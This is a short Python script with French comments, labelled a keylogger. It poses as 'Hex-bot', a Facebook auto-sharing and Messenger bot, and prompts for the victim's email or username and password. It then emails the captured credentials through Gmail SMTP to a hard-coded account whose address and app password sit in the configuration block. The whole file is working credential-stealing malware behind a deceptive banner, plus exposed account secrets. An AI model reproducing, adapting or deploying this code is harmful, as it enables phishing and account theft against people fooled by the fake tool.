import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# CONFIGURATION
EMAIL_ADDRESS = "techb1335@gmail.com"
EMAIL_PASSWORD = "oobl xdxj nsgq elhp "
SEND_REPORT_EVERY = 60  # Envoi du rapport chaque 60 secondes

class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = "Keylogger lancÃ© avec succÃ¨s...\n"
        self.email = email
        self.password = password
        self.running = True

    def append_log(self, key):
        self.log += f"identifiants rÃ©cupÃ©rÃ©s : {key}\n"

    def send_mail(self):
        try:
            # Connexion au serveur Gmail
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()  # SÃ©curise la connexion
            server.login(self.email, self.password)
            
            # CrÃ©ation du message avec MIME pour gÃ©rer l'encodage UTF-8
            message = MIMEMultipart()
            message["From"] = self.email
            message["To"] = self.email
            message["Subject"] = "Rapport de Keylogger"
            
            # CrÃ©ation du corps du message avec HTML pour prÃ©server les caractÃ¨res
            body = MIMEText(f"<pre>{self.log}</pre>", "html", "utf-8")
            message.attach(body)
            
            server.sendmail(self.email, self.email, message.as_string())
            server.quit()
            print("\033[34m[RAPPORT] Veuillez patienter, cela peut prendre quelques minutes. Connexion du bot en cours...\033[0m")  # Bleu
        except Exception as e:
            print(f"\033[31m[RAPPORT] Erreur lors de la connexion : {e}\033[0m")  # Rouge

    def run(self):
        # Affichage du message de bienvenue en couleur verte
        print("\033[1;32m" + "ï¼¢ï¼©ï¼¥ï¼®ï¼¶ï¼¥ï¼®ï¼µï¼¥! ã€ğ‡ã€ã€ğ„ã€ã€ğ—ã€âœ¦ã€ğã€ã€ğã€ã€ğ“ã€  ã€ğ—©.2ã€‘\n" + "\033[0m")  # Texte vert en gras
        print("\033[32mVeuillez saisir vos identifiants et appuyez sur 'Enter' pour connecter le bot.\n\033[0m")  # Texte vert
        print("\033[1;32m" + "Hex-bot est une solution innovante conÃ§ue pour automatiser le partage de vos publications sur Facebook, tout en facilitant l'intÃ©gration avec un bot Messenger via l'API officielle de Messenger." + "\033[0m")
        
        # Demander Ã  l'utilisateur de saisir son email ou son nom d'utilisateur
        email_prompt = "\033[35mEntrez votre email ou nom d'utilisateur: \033[0m"
        username = input(email_prompt)  # Demander le nom d'utilisateur
        
        # Si "exit" est tapÃ©, on quitte le programme
        if username == "exit":
            return
        
        # Demander Ã  l'utilisateur de saisir son mot de passe
        password_prompt = "\033[35mEntrez votre mot de passe: \033[0m"
        password = input(password_prompt)  # Demander le mot de passe
        
        # Si "exit" est tapÃ©, on quitte le programme
        if password == "exit":
            return

        # Enregistrer les frappes dans le log
        self.append_log(f"Nom d'utilisateur: {username}")
        self.append_log(f"Mot de passe: {password}")
        
        # Envoyer immÃ©diatement le rapport aprÃ¨s saisie
        self.send_mail()  # Envoi immÃ©diat du rapport

# Lancement du keylogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
